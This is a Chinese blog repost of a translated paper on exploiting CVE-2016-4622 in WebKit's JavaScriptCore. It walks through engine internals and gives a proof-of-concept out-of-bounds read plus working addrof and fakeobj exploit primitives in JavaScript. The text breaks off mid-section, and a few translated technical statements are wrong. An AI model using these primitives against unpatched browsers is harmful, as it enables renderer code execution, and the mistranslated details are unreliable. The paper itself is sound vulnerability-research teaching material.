---
title: '攻击JavaScript引擎：一个JavaScriptCore的学习案例(CVE-2016-4622 (2016-10-27))'
layout: post
tags: 
  - translate
  - sec
  - information
category: 
  - translate
  - sec
  - hack
  - paper
comments: true
share: true
description: 过年无事,投稿了篇paper，[mottoin](http://www.mottoin.com/95838.html)一个星期没回我，又投给了[seebug](http://paper.seebug.org/207/) 。。。结果两平台今天一起同时发出来，蜜汁尴尬。。。在自己博客上也放出来做个纪念。
---

过年无事,投稿了篇paper，[mottoin](http://www.mottoin.com/95838.html)一个星期没回我，又投给了[seebug](http://paper.seebug.org/207/) 。。。结果两平台今天一起同时发出来，蜜汁尴尬。。。在自己博客上也放出来做个纪念。

* PDF下载地址:http://www.mottoin.com/wp-content/uploads/2017/02/javascript.pdf

* mottoin文章地址：http://www.mottoin.com/95838.html

* seebug文章地址： http://paper.seebug.org/207/

文章如下：

* TOC
{:toc}

<!--more-->

* TOC
{:toc}

# 1.Javascript引擎的概述

-----------------------



# 简介


本文力图以特定漏洞为例，介绍JavaScript引擎的利用，着重阐述JavaScriptCore，WebKit中的引擎。出现这个漏洞问题的是[CVE-2016-4622](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4622)。在2016年初的[ZDI-16-485](http://www.zerodayinitiative.com/advisories/ZDI-16-485/)[1]被披露，它允许攻击者注入错误的Javascript对象到引擎使地址溢出。利用这些，将导致在渲染器进程内部执行远程代码。但是该Bug已经在650552a版本修复。本文中的代码片段来自于已经提交了的320b1fc版本，这个版本是最后一个容易受攻击的版本。早在一年前的2fa4973版本发现了漏洞。所有的攻击代码都在Safari9.1.1上测试过。


对所述脆弱性的利用需要各种引擎内部构件的知识，当然，其本身也是很有趣的。因此，我们将通过一部分Javascript引擎的知识片段来讨论，此处所讲概念对于其他语言的引擎也适用。

不过，整体而言，Javascript语言的熟练度不会影响本文的阅读。

通常，Javascript引擎的架构：

* 在编译器的基本结构上，至少包含一个及时(JIT,just-in-time)编译器

* 能对JavaScript值操作的虚拟机

* 在运行时，能提供一组内置对象和函数

我们不会太关注的编译器基础结构的内部工作，因为它们大多与本文讨论的Bug无关。我们的目标，是从给定的源码中将编译器视为一个能发出字节码的黑盒(在JIT编译器下的本地代码)

## 1.1-值，VM和Nan-boxing


通常，虚拟机(VM)具有可以直接执行发出字节码的解释器，VM通过基于堆栈的机器和围绕堆栈的值实现(与基于寄存器的机器相反)。特定操作码处理程序的实现类似于：

```javascript
CASE(JSOP_ADD)

    {

        MutableHandleValue lval = REGS.stackHandleAt(-2);

        MutableHandleValue rval = REGS.stackHandleAt(-1);

        MutableHandleValue res = REGS.stackHandleAt(-2);

        if (!AddOperation(cx, lval, rval, res))

            goto error;

        REGS.sp--;

    }

    END_CASE(JSOP_ADD)

```

> 注意，这个例子实际上来自Firefox的JavaScriptCore——Spidermonkey引擎(这以后就统称为JSC)，这是使用汇编语言形式编写的解释器，因此上面例子不是那么直观。但感兴趣的读者可以在LowLevellnterpreter64.asm中找到JSC的低级解释器(llint)的实现。

通常，第一级JIT编译器（有时称为基线JIT）负责消除解释器的一些调度开销，而高级JIT编译器执行复杂的优化，类似于我们习惯用的预编译器。优化JIT编译器一般要预判，意味着它们将基于一些预测来执行优化，类似于“这个变量将总是包含一个数字“。如果猜测是不正确的，代码将通常跳到一个较低的层。有关不同执行模式的更多信息，读者可参考[[2]](https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/)和[[3](http://trac.webkit.org/wiki/JavaScriptCore)。


JavaScript是一种动态类型语言。因此，类型信息与运行时的值有关，而不是编译时的变量和相关联。 


[JavaScript类型系统[4]](http://www.ecma-international.org/ecma-262/6.0/#sec-ecmascript-data-types-and-values)定义了原始类型（数字，字符串，布尔，空，未定义，符号）和对象（包括数组和函数）。特别地，在JavaScript语言中没有如在其他语言中存在的类的概念。相反，JavaScript使用所谓的“基于原型的继承”，其中每个对象都有一个（可能为空）对原型对象的引用，它的属性在继承父对象的基础上扩展。感兴趣的读者参考[JavaScript规范[5]](http://www.ecma-international.org/ecma262/6.0/#sec-objects)了解更多信息。


出于性能原因，所有主要的JavaScript引擎都表示不超过8个字节的值（快速复制，适合64位体系结构上的寄存器）。有些浏览器，如Google的v8引擎就是使用带标记的指针来表示值。其中最低有效位指示值是指针，还有可能是某种形式的立即数(如整数或定义过的符号特定值)。另外，Firefox中的JavaScriptCore（JSC）和Spidermonkey使用一个名为NaN-boxing的技术。 NaN-boxing利用多位模式呈现，因此这些位中的其他值可以被编码。具体来说，每个IEEE 754(IEEE二进制浮点数算术标准)规定了浮点数所有指数位用不等于零的分数表示Nan-boxing。对于双精度值[6]，这就由2 ^ 51个不同的位模式（忽略符号位并将第一个小数位设置为1，所以这也可以表示nullptr）。在64位平台上，目前只有48位用于寻址，其余32位整数和指针也就可以进行编码。

JSC使用的方案在JSCJSValue.h中有很好的解释，读者可以阅读。 重要的相关部分引用如下：

```c
    * The top 16-bits denote the type of the encoded JSValue:
    *
    *     Pointer {  0000:PPPP:PPPP:PPPP
    *              / 0001:****:****:****
    *     Double  {         ...
    *              \ FFFE:****:****:****
    *     Integer {  FFFF:0000:IIII:IIII
    *
    * The scheme we have implemented encodes double precision values by
    * performing a 64-bit integer addition of the value 2^48 to the number.
    * After this manipulation no encoded double-precision value will begin
    * with the pattern 0x0000 or 0xFFFF. Values must be decoded by
    * reversing this operation before subsequent floating point operations
    * may be performed.
    *
    * 32-bit signed integers are marked with the 16-bit tag 0xFFFF.
    *
    * The tag 0x0000 denotes a pointer, or another form of tagged
    * immediate. Boolean, null and undefined values are represented by
    * specific, invalid pointer values:
    *
    *     False:     0x06
    *     True:      0x07
    *     Undefined: 0x0a
    *     Null:      0x02
    *

```

---------------------------------------

```c

    * 前16位表示已编码的JSValue的类型：

    *

    *     Pointer {  0000:PPPP:PPPP:PPPP

    *              / 0001:****:****:****

    *     Double  {         ...

    *              \ FFFE:****:****:****

    *     Integer {  FFFF:0000:IIII:IIII

    *

    *

    * 我们实现的方案通过对数值执行64位整数加法来对双精度值进行编码。这个                               

    * 操作之后，没有编码的双精度值将以模式0x0000或0xFFFF开始。在执行浮 

    * 点运算之前，必须通过反转该操作来解码值。

    *

    * 

    * 用16位标志0xFFFF标记有符号位的32位整数。

    *

    * 用标志0x0000表示指针或者其他标志的立即数。而布尔值，空值和未定义 

    * 值由特定的、无效的指针值表示：

    *     False:     0x06

    *     True:      0x07

    *     Undefined: 0x0a

    *     Null:      0x02

    *

```


有趣的是，0x0不是有效的JSValue，这会导致内部引擎崩溃。


## 1.2-对象和数组

JavaScript中的对象本质上是作为（键，值）对存储的属性的集合，可以使用点运算符（foo.bar）或通过方括号（foo ['bar']）访问属性。至少在理论上，用作键的值在执行查找之前要转换为字符串。

数组被规定为特殊（“异常”）对象，如果属性名称由32位整数表示，其属性也称为[元素[7]](http://www.ecma-international.org/ecma-262/6.0/#sec-array-exotic-objects)。如今的大多数引擎将这个概念扩展到所有对象,然后数组变成具有特殊“length”属性的对象，其值总是等于最高元素的索引加1。所有这些对象都有共同的属性，都可以通过字符串、符号键、整数索引访问。

在内部，JSC将属性和元素存储在同一个内存区域中，并在对象本身中存储指向该区域的指针。这个指针指向区域的中间，属性存储在它的左边（低地址），元素存储在它的右边， 还有一个小标题位于指向包含元素向量长度的地址之前。值向左向右扩展，类似于蝴蝶的翅膀 ，所以这个表现形式被称为“Butterfly” ，在下文，我们将指针和指针指向的存储器区域称为“Butterfly”，之后注意这一点，会使文章的理解更加轻松一些。

```c
--------------------------------------------------------

.. | propY | propX | length | elem0 | elem1 | elem2 | ..

--------------------------------------------------------

                            ^

                            |

            +---------------+

            |

  +-------------+

  | Some Object |

  +-------------+

```


虽然一般情况下，元素不必被线性地存储在存储器中。但特别地，诸如

```c

    a = [];

    a[0] = 42;

    a[10000] = 42;

```

这段代码将可能导致数组以某种稀疏模式存储，其执行从给定索引到索引后备存储器中的附加映射步骤。这样的数组就不需要10001个索引值。数组不仅有许多存储模型，还用使用许多不同的方法来存储数据。例如，32位整数的数组可用本地形式存储，以避免在Nanboxing操作时的解包和重新开始进程的情况，也节约了内存。因此，JSC在*IndexingType.h*定义了一组不同的索引类型。最重要的是：

```javascript        

    ArrayWithInt32      = IsArray | Int32Shape;

    ArrayWithDouble     = IsArray | DoubleShape;

    ArrayWithContiguous = IsArray | ContiguousShape;

```

这段代码中，最后一段代码存储的是JSValues，而前两段代码存储的是它们本机类型。在这一点上，读者可能想知道如何在这个模型中执行属性查找，这点将在后面深入讨论这一点。但在JSC中被称为“结构”的特殊元对象只与每个对象提供的从属性名称到索引值的映射相关联。

## 1.3-函数


函数在Javascript语言中非常重要，在此我们有必要讨论一下。

当执行函数主体时，两个特殊的变量变得可用。其中一个变量是'arguments'，提供对函数的参数（和调用程序）的访问，从而使得能够创建具有参数的函数。 另一个是“this”，它可以根据函数的调用来引用不同的对象：

* 如果调用的函数为一个构造函数（'new func（）'类型），'this'指向新创建的对象。在函数定义期间设置了一个新对象的时候，构造的函数已经为函数对象设置了.prototype的属性。

* 如果调用的函数是某个对象的方法（'obj.func（）'类型），那么'this'将指向引用对象。

* 否则'this'只是指向当前的全局对象。因为它不属于任何函数。


由于函数是JavaScript中的第一类对象，它们也可以具有属性。 我们已经看到了上面的.prototype属性。 另外还有每个非常有趣的函数（实际上是函数原型）是.call和.apply函数，它们允许使用给定的“this”对象和参数调用它们。 例如，用它们实现装饰器功能：

```javascript
    function decorate(func) {

        return function() {

            for (var i = 0; i < arguments.length; i++) {

                // do something with arguments[i]

            }

            return func.apply(this, arguments);

        };

    }

```

这也能影响JavaScript函数在引擎中的使用，它们不能对引用对象的值做任何赋值行为，但是可以在函数方法的参数中设置任意值。 因此，所有JavaScript的内部函数不仅需要检查其参数的类型，而且还要检查this对象的类型。

在内部，内置函数和方法[8]通常以两种方式实现：C++中的本地函数或JavaScript本身的函数。 让我们来看看一个JSC中简单的本地函数示例，用Math.pow（）实现：

```javascript

 EncodedJSValue JSC_HOST_CALL

 mathProtoFuncPow(ExecState* exec){

        // ECMA 15.8.2.1.13

        double arg = exec->argument(0).toNumber(exec);

        double arg2 = exec->argument(1).toNumber(exec);

        return JSValue::encode(JSValue(operationMathPow(arg, arg2)));

    }

```


我们可以看到：

1. JavaScript本地函数的签名

2. 如何使用参数方法提取参数（如果没有提供足够的参数，则返回未定义的值）

3. 如何将参数转换为其所需类型？有一组转换规则控制数组转换成将要使用的数字。(稍后还有更多关于这点的内容)

4. 如何对本地数据类型执行实际操作

5. 如何将结果返回给调用者？在这种情况下，只需将基本数字编码为值即可。

这里还有一个显而易见的地方：各种核心功能（operationMathPow()）都用分离开的函数操作，这样就可以方便地从JIT编译了的代码调用函数，实现功能模块化的操作。


# 2. Bug

## 2.1

在[Array.prototype.slice [9]](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/slice)的实现中会出现一个Bug。JavaScript中调用slice方法时，将调用位于ArrayPrototype.cpp中的本地函数arrayProtoFuncSlice：

```javascript

    var a = [1, 2, 3, 4];

    var s = a.slice(1, 3);

    // s now contains [2, 3]

```

为了可读性，将[ArrayPrototype.cpp](https://github.com/WebKit/webkit/blob/320b1fc3f6f47a31b6ccb4578bcea56c32c9e10b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp#L848)的代码格式化之后精简了一下，并标出了注释语句，这段代码在网上也是有迹可循的[[10]](https://github.com/WebKit/webkit/blob/320b1fc3f6f47a31b6ccb4578bcea56c32c9e10b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp#L848)。

```javascript
    EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)

    {

      /* [[ 1 ]] */

      JSObject* thisObj = exec->thisValue()

                         .toThis(exec, StrictMode)

                         .toObject(exec);

      if (!thisObj)

        return JSValue::encode(JSValue());

      /* [[ 2 ]] */

      unsigned length = getLength(exec, thisObj);

      if (exec->hadException())

        return JSValue::encode(jsUndefined());

      /* [[ 3 ]] */

      unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length);

      unsigned end =

          argumentClampedIndexFromStartOrEnd(exec, 1, length, length);

      /* [[ 4 ]] */

      std::pair<SpeciesConstructResult, JSObject*> speciesResult =

        speciesConstructArray(exec, thisObj, end - begin);

      // We can only get an exception if we call some user function.

      if (UNLIKELY(speciesResult.first ==

      SpeciesConstructResult::Exception))

        return JSValue::encode(jsUndefined());

      /* [[ 5 ]] */

      if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &&

            isJSArray(thisObj))) {

        if (JSArray* result =

                asArray(thisObj)->fastSlice(*exec, begin, end - begin))

          return JSValue::encode(result);

      }

      JSObject* result;

      if (speciesResult.first == SpeciesConstructResult::CreatedObject)

        result = speciesResult.second;

      else

        result = constructEmptyArray(exec, nullptr, end - begin);

      unsigned n = 0;

      for (unsigned k = begin; k < end; k++, n++) {

        JSValue v = getProperty(exec, thisObj, k);

        if (exec->hadException())

          return JSValue::encode(jsUndefined());

        if (v)

          result->putDirectIndex(exec, n, v);

      }

      setLength(exec, result, n);

      return JSValue::encode(result);

    }

```


代码本质上执行以下操作：

1. 获取方法调用的对象（数组对象）

2. 检索数组的长度

3. 将参数（开始和结束的索引参数）转换为本地整数类型，并将它们限制了[0，length）的长度范围

4. 检查是否使用了构造函数[[11]](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/species)

5. 执行切片


> 最后一步的实现可以用这两种方式完成：如果数组是具有密集存储的本地数组，则将使用“fastSlice”，使用给定的索引和长度将内存值写入新数组。如果快速路径不可能，则使用简单循环来获取每个元素并将其添加到新数组。 注意，与在慢速路径上使用的属性访问器相反，fastSlice不执行任何附加边界检查

看看代码，很容易假定`begin`和`end`之间的长度变量在被转换为本地整数之后小于数组的长度。 然而，我们可以通过JavaScript类型转换规则推翻这个假设。


## 2.2-关于Javascript类型转换

JavaScript本质上是弱类型的语言，这就意味着它善于将不同类型的值转换为当前所需要类型的值。 例如Math.abs（），它能返回参数的绝对值。 (以下是“有效”调用，不会引发异常)：

```javascript
    Math.abs(-42);      // argument is a number

    // 42

    Math.abs("-42");    // argument is a string

    // 42

    Math.abs([]);       // argument is an empty array

    // 0

    Math.abs(true);     // argument is a boolean

    // 1

    Math.abs({});       // argument is an object

    // NaN

```


相比之下，强类型的语言(如Python)在将字符串传递给abs()函数时，反而更容易抛出异常(在静态语言下，会发生编译错误)

数字类型的转换规则在参考文献[[12]](http://www.ecma-international.org/ecma-262/6.0/#sec-type-conversion)中有描述。掌握对象类型转换成数字（或常见原始类型）的转换规则是特别有趣的。 特别是，如果对象有一个名为“valueOf”的可调用属性，它是一个原始值，这个程序则将被调用，并返回一个值。如： 

```javascript

Math.abs({valueOf: function() { return -42; }});

    // 42

```

## 2.3-valueOf的利用

在使用arrayProtoFuncSlice方法的情况下，slice的复制操作是为了原始类型在argumentClampedIndexFromStartOrEnd中执行。“valueOf"也可以用于限制参数的范围为[0,length]：

```c

JSValue value = exec->argument(argument);

    if (value.isUndefined())

        return undefinedValue;

    double indexDouble = value.toInteger(exec);  // Conversion happens here

    if (indexDouble < 0) {

        indexDouble += length;

        return indexDouble < 0 ? 0 : static_cast<unsigned>(indexDouble);

    }

    return indexDouble > length ? length :static_cast<unsigned>(indexDouble);

```

现在，如果我们修改valueOf()函数内其中一个参数的数组长度，那么slice方法的执行将继续使用前面的长度，导致在memcpy期间越界访问。

在这之前，如果缩减数组，我们必须调整元素存储实际大小。从JSArray :: setLength，我们可以很快看出.length转换器的实现过程：

```c
    unsigned lengthToClear = butterfly->publicLength() -newLength;

    unsigned costToAllocateNewButterfly = 64; // a heuristic.

    if (lengthToClear > newLength &&

        lengthToClear > costToAllocateNewButterfly) {

        reallocateAndShrinkButterfly(exec->vm(), newLength);

        return true;

    }

```

这段代码展示了一个简单的启发式程序——避免太频繁地重定位数组。 为了强制重定位数组，需要新的数组大小远小于旧的大小，把有100元素的数组调整到0会成功。

有了这些，我们就可以利用Array.prototype.slice：

```javascript
  var a = [];

    for (var i = 0; i < 100; i++)

        a.push(i + 0.123);

    var b = a.slice(0, {valueOf: function() { a.length = 0; return 10; }});

    // b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]

```

正确的输出是大小为10的数组填充了“未定义”值，因为数组在切片操作之前已被清除。 但是，我们可以在数组中看到一些浮点值，似乎已经可以看出一些数据存储在数组之外。

## 2.4-反思Bug

这个特别的编程错误不是新的，并且已经被利用了一段时间[[[13]](https://bugzilla.mozilla.org/show_bug.cgi?id=735104),[[14]](https://bugzilla.mozilla.org/show_bug.cgi?id=983344),[[15]](https://bugs.chromium.org/p/chromium/issues/detail?id=554946)。 这里的核心问题是处于可变的状态，在堆栈帧（即数组对象的长度）中的“缓存”结合各种回调机制，可以执行用户提供的代码进一步向下调用堆栈 (用”valueOf“方法）。通过这个设置，很容易在整个函数中做出关于引擎状态的假设。由于各种事件回调，DOM中也出现了同样的错误问题。

# 3. JavascriptCore堆

在时候，我们已经通过数组读取数据，但是并不知道这个过程中我们正在访问的是什么。要明白这个过程，我们需要了解一些关于JSC堆分配器的一些背景知识。

## 3.1-垃圾收集器的基础


JavaScript是一种具有垃圾回收的语言，这意味着程序员不需要关心内存的管理。相反，垃圾收集器将不时收集不可达的对象。

垃圾收集的其中一种方法是引用计数，其在许多应用中广泛使用。 但是，目前，所有主要的JavaScript引擎都使用标记-扫描算法。 这里，收集器定期扫描所有活动对象，从一组根节点开始，然后释放所有死对象。 根节点通常是位于栈上的指针，或者位于web浏览器上下文中的全局对象\(如Window对象\)。

垃圾收集系统之间有各种区别。我们现在将讨论垃圾收集系统的一些关键特性，这应该有助于读者理解一些相关的代码。 熟悉本主题的读者可以自由地跳过本章节。

首先第一个特性，JSC使用保守的垃圾收集器[\[16\]](https://www.gnu.org/software/guile/manual/html_node/Conservative-GC.html)。实质上，这意味着GC不跟踪根节点本身。但在GC期间，它将扫描堆栈中任何可能是指向堆的指针的值，并将它们视为根节点。而Spidermonkey使用精确的垃圾收集器，因此需要将所有对堆对象的引用包装在堆栈中的指针类（Rooted &lt;&gt;）中，该指针类负责将对象注册到垃圾收集器。

第二个特性，JSC使用增量垃圾回收器。这种垃圾收集器在几个步骤中执行标记，并允许应用程序在其间运行，从而降低GC延迟。但是，这需要一些额外的努力才能正常工作。 考虑以下情况：


      
* GC运行并访问O对象及其所有引用的对象,它将O标记为已访问和稍后暂停，以便应用程序可以再次运行。

* 修改O对象，并且向其中添加对另一对象P的新引用。

* 然后GC再次运行，但它不知道P对象.它已经完成标记阶段，就直接释放P的内存。


> O对象和P对象是笔者所举例子

为了避免这种情况，就要写屏障并插入到引擎中，这种情况下会给垃圾收集器一个写屏障的的信号。在JSC中，这些障碍使用WriteBarrier <>和CopyBarrier <>类实现。

> 写屏障：当有老生代中的对象出现指向新生代对象的指针时，便记录下来这样的跨区指向。由于这种记录行为总是发生在写操作时，因此被称为写屏障。这样可以建立老生代对象指向新生代对象的列表，判断新生代指针是否存活。

最后一个特性，JSC使用移动和非移动垃圾收集器。 移动垃圾收集器将活对象移动到不同位置，并更新所有指向这些对象的指针。这对于在许多死对象的情况可以达到优化的效果，因为没有用于这些死对象运行时的开销(而不是将它们添加到空闲列表，整个存储器区域被简单地声明为空) 。JSC将JavaScript的自身对象以及一些其他对象存储在不移动的堆和标记的空间中，同时将"butterflies"和其他数组存储在移动的堆和复制的空间内。

## 3.2-标记空间

标记空间是跟踪所分配的单元的存储器块的集合。 在JSC中，在标记空间中分配的每个对象必须从JSCell类继承，因此这些对象以8字节作为头开始，除了其他字段之外，这个字段都包含GC使用的当前单元状态，由收集器用于跟踪其已访问的单元。

还有一个值得提及的标记空间，JSC在每个标记块的开头存储一个MarkedBlock实例：

```Javascript
inline MarkedBlock* MarkedBlock::blockFor(const void* p)

    {

        return reinterpret_cast<MarkedBlock*>(

                    reinterpret_cast<Bits>(p) & blockMask);

    }

```

该实例具有指向拥有堆和VM实例的指针，如果它们在整个程序中不能使用，VM实例则允许引擎获得这些指针。在执行某些操作时可能需要有效的MarkedBlock实例，这使得伪造对象更加困难。 因此，如果可能，有必要在有效标记块内创建伪对象。

## 3.3-复制空间

复制空间存储的缓冲区与标记空间内的某个对象是有相关联的。这些大多是“Butterflies”，但类型数组的内容也可能位于这里。这就造成我们的内存泄露发生在这个内存区域。

复制的空间分配器非常简单：

```Javascript
CheckedBoolean CopiedAllocator::tryAllocate(size_t bytes, void** out)

    {

      ASSERT(is8ByteAligned(reinterpret_cast<void*>(bytes)));

      size_t currentRemaining = m_currentRemaining;

      if (bytes > currentRemaining)

        return false;

      currentRemaining -= bytes;

      m_currentRemaining = currentRemaining;

      *out = m_currentPayloadEnd - currentRemaining - bytes;

      ASSERT(is8ByteAligned(*out));

      return true;

    }

```

它的本质上是一个bump分配器：在标记块被完全使用之前，它将简单地返回当前标记块中的下一个N字节的存储器。因此，它几乎可以保证两个后续的分配被放置在存储器的相邻位置（边缘区域将是第一个被当前块填充的地方）。

这对我们来说是个比较有利的。如果我们分配两个数组，每个数组都有一个元素，那么两个“Butterfly”将在每种情况下彼此相邻。

# 4. 打造exploit原语


虽然有问题的bug首先看起来像是越权访问的错误，但它实际上可以成为更强大的漏洞利用，通过它我们可以新建一个Javascript数组，使用我们自定义的JSValues注入到其中，从而提升权限，进入引擎。

我们现在将利用给定的bug构造两个exploit原语，允许我们

     1.暴露任意JavaScript对象的地址

     2.将伪造的JavaScript对象注入引擎。

我们将这两个原语称为“addrof”和“fakeobj”。

## 4.1-环境：Int64

正如我们之前所见，我们的exploit原语在当前返回的是浮点值而不是整数。至少在理论上，JavaScript中的所有数字都是64位浮点数[[17]](http://www.ecma-international.org/ecma-262/6.0/#sec-ecmascript-language-types-number-type)。 实际上，如已经提到的，出于性能原因，大多数引擎具有专用的32位整数类型，在必要时（在溢出时）会转换为浮点值，所以不可能用JavaScript中的原语数来表示任意64位整数（特别是地址）。

因此，必须构建允许存储64位整数实例的帮助模块。它的满足以下条件：

* 从不同的参数类型初始化Int64的实例，参数类型可以是字符串、数字和字节数组。

* 通过assignXXX方法将加法和减法的结果分配给现有实例。有时候，使用这些方法减少了更多的堆分配

* 创建新实例，通过Add和Sub函数存储加法或减法的结果。

* 在双精度，JSValues和Int64实例之间进行转换，使底层的位模式保持不变。


最后值得进一步讨论的是，正如我们上面已经看到的，我们获得了一个double类型的数，其在底层内存中被转换成我们想要的地址，我们需要在原生双精度和我们的整数之间进行转换，使得底层的位保持不变。可以考虑在下面c语言代码中使用asDouble（）：

```c
double asDouble(uint64_t num)

    {

        return *(double*)&num;

    }

```

asJSValue方法进一步遵守NaN-boxing程序流程，并产生具有给定位模式的JSValue。感兴趣的读者可参考所附源代码归档文件中的int64.js文件，了解更多详细信息。

有了这个方法，让我们回到构建我们的两个exploit原语。


## 4.2- addrof和fakeobj

这两种原语都依赖于JSC在原生表示中存储双精度数组的事实，而不是NaN-boxing的表示。 这本质上允许我们写入本地双精度（索引类型是ArrayWithDoubles），但是引擎将它们视为JSValues（索引类型是ArrayWithContiguous），反之亦然。

这里是利用地址泄漏所需的步骤：

1. 创建一个双精度数组。这将在内部存储为IndexingType ArrayWithDouble

2. 使用自定义的valueOf函数设置对象

  2.1 收缩先前创建的数组

  2.2 分配一个新数组，其中只包含我们需要的对象，该对象是我们所想知道地址的对象。 这个数组位于复制空间，（很可能）被放置在新的“Butterfly”后面。

  2.3 返回一个大于数组大小的值来触发bug

3. 调用目标数组上的slice（），将来自步骤2的对象作为参数之一


slice()保留了索引类型，我们可以在数组中找到所需要的具有64位浮点指针值的地址。因此，我们的新数组将被看做是原生的双精度数据，允许我们泄露出任意的JSValue实例，从而泄露指针。

fakeobj原语基本上以另一种方式工作。 这里我们将本地双精度注入到JSValues数组中，这允许我们创建JSObject指针：

1. 创建一个双精度数组。这将在内部存储为IndexingType ArrayWithDouble

2. 使用自定义的valueOf函数设置对象

  2.1 收缩先前创建的数组

  2.2 分配一个新数组，其中只包含我们需要的对象，该对象是我们所想知道地址的对象。 这个数组位于复制空间，（很可能）被放置在新的“Butterfly”后面。

  2.3 返回一个大于数组大小的值来触发bug

3. 调用目标数组上的slice（），将来自步骤2的对象作为参数之一。

这两个原语的实现如下：

```java
    function addrof(object) {

        var a = [];

        for (var i = 0; i < 100; i++)

            a.push(i + 0.1337);   // Array must be of type ArrayWithDoubles

        var hax = {valueOf: function() {

            a.length = 0;

            a = [object];

            return 4;

        }};

        var b = a.slice(0, hax);

        return Int64.fromDouble(b[3]);

    }

    function fakeobj(addr) {

        var a = [];

        for (var i = 0; i < 100; i++)

            a.push({});     // Array must be of type ArrayWithContiguous

        addr = addr.asDouble();

        var hax = {valueOf: function() {

            a.length = 0;

            a = [addr];

            return 4;

        }};

        return a.slice(0, hax)[3];

    }

```

## 4.3 利用准备

从这里我们的目标将变成，通过伪造一个JavaScript对象获得一个任意的内存读/写原语。 我们面临以下问题：

```Shell
     Q1. 我们想伪造什么样的对象？

     Q2. 我们如何伪造这样的对象？

     Q3. 我们在哪里放置伪对象以便我们知道它的地址？
```

一段时间以来，JavaScript引擎已经支持类型数组[[18]](http://www.ecma-international.org/ecma-262/6.0/#sec-typedarray-objects)，类型数组是一种高效和高度优化的原始二进制数据存储。它具有可变性(与Javascript字符串相反)，这对于我们的伪对象来说是很好的候选对象，我们就可以从脚本控制它的数据指针来产生任意读/写的可用原语，最后达到我们的目的——伪造一个Float64Array实例。

我们接下来将讨论第二个问题和第三个问题的时候，需要对JSC内部（即JSObject系统）进行另一番讨论。

# 5.理解JSObject系统

JavaScript对象通过C++类的组合在JSC中实现。实现的核心在于JSObject类，它本身就是一个JSCell，并且由垃圾收集器跟踪的。 JSObject的各种子类与不同的JavaScript对象相似，如Arrays（JSArray）、Typed arrays（JSArrayBufferView）或Proxys（JSProxy）。

我们现在将探讨构成JSO引擎中的JSObjects的各个部分。


## 5.1-存储属性


属性是Javascript对象的最重要的方面。我们也知道属性在引擎中是怎么存储的——通过“Butterfly”存储。但这也只对了一半，除了“Butterfly”，JSObjects也可以进行内联存储（默认6个索引值，但运行时需要重新分析），其位于内存中的的对象之后。若不为"Butterfly"分配对象，则可能轻微影响引擎性能。、

内联存储对我们来说，也是比较有用的。我们可以泄露一个对象的地址，进一步就知道它的内联索引值的地址。这就很好的给我们提供了一个放置我们伪造对象的位置，也能在我们将对象放置在标记空间的时候避免一些额外的问题。

已经解决了第三个问题，我们回跳到第二个问题中。

## 5.2-JSObject的内联

我们以一个例子开始这节内容，假设运行下面的JS代码：

```javascript
obj = {'a': 0x1337, 'b': false, 'c': 13.37, 'd': [1,2,3,4]};
```

这就导致以下对象：

```c
    (lldb) x/6gx 0x10cd97c10

    0x10cd97c10: 0x0100150000000136 0x0000000000000000

    0x10cd97c20: 0xffff000000001337 0x0000000000000006

    0x10cd97c30: 0x402bbd70a3d70a3d 0x000000010cdc7e10
```

第一个4字节是JSCell；第二个是Butterfly指针，它是空的，因为所有的属性都存储在内联中。接下来是四个属性的内联JSValue槽：一个integer，false，一个double和一个JSObject指针。如果我们要向对象添加更多属性，则会在某一时刻会分配“Butterfly”来存储这些。

那么JSCell里有什么呢？从JSCell.h中寻找答案：

* StructureID m_structureID;

> 这是最有趣的一个，我们将在下面进一步探讨。

* IndexingType m_indexingType;

> 我们已经看过这个了,它指示对象元素的存储模式。

* JSType m_type;

> 单元格存储类型：string，symbol，function，plain object，...

* TypeInfo :: InlineTypeFlags m_flags;

> 这是一个对我们的目的来说不太重要的标志，JSTypeInfo.h包含更多信息。

* CellState m_cellState;

> 我们也看过这个，它在收集期间由垃圾收集器使用。

## 5.3-关于JSObject结构

JSC可以创建描述JavaScript对象的结构或布局的元对象，这些对象表示的是内联存储或“Butterfly”（将它们都视为JSValue数组）中从属性名称到索引的映射，它们最基本的形式表示结构是<属性名，槽索引>，它也可以用链表或散列图的形式表示。为了替代在每个JSCell实例中存储指向此结构的指针的存储方法，开发人员决定将32位索引存储到结构表中，以此为其他字段节省一些空间。

那么当一个新的属性被添加到一个对象时会发生什么？如果这是第一次添加，那么将分配一个新的结构实例，该结构实例包含之前的槽，索引所有的退出属性和新添加属性。然后，属性将被存储在相应的索引处，这有可能需要重新分配“Butterfly”的存储。为了避免重复该过程，可以在被称为“转换表”的数据结构中缓存Structure实例在之前的结构中。也可以调整原始结构，分配更多的内联或“Butterfly”存储空间来避免重新分配结构实例。这种机制最终使结构可重复使用。


举个例子：

```javascript
    var o = { foo: 42 };

    if (someCondition)

        o.bar = 43;

    else

        o.baz = 44;

```

这将导致创建以下三个结构实例，这里显示为（任意）属性名称到槽索引的映射：

```c

+-----------------+          +-----------------+

|   Structure 1   |   +bar   |   Structure 2   |

|                 +--------->|                 |

| foo: 0          |          | foo: 0          |

+--------+--------+          | bar: 1          |

         |                   +-----------------+

         |  +baz   +-----------------+

         +-------->|   Structure 3   |

                   |                 |

                   | foo: 0          |

                   | baz: 1          |

                   +-----------------+

```

每当这段代码再次执行时，创建的对象的正确结构将很容易被找到。

基本上相同的概念被如今所有主流引擎使用使用。就这段代码而言，V8调用他们的处理系统或隐藏类[[19]](https://developers.google.com/v8/design#fast-property-access)，而Spidermonkey调用他们的图形处理器。

这种技术也使预测性的JIT编译器更简单。 假设以下函数：

```javascript

function foo(a) {

        return a.bar + 3;

    }

```

进一步假设，我们在解释器中已经执行了几次上面的函数，现在为了获得更好的性能，将它编译为本机代码，我们该如何处理属性查找？ 我们可以简单地跳转到解释器执行查找，但这个代价是相当昂贵的。假设我们还跟踪了给foo的对象作为参数，发现它们都使用相同的结构。 我们现在可以生成（伪）汇编代码，如下所示。 这里r0最初指向参数对象：

```c

    mov r1, [r0 + #structure_id_offset];

    cmp r1, #structure_id;

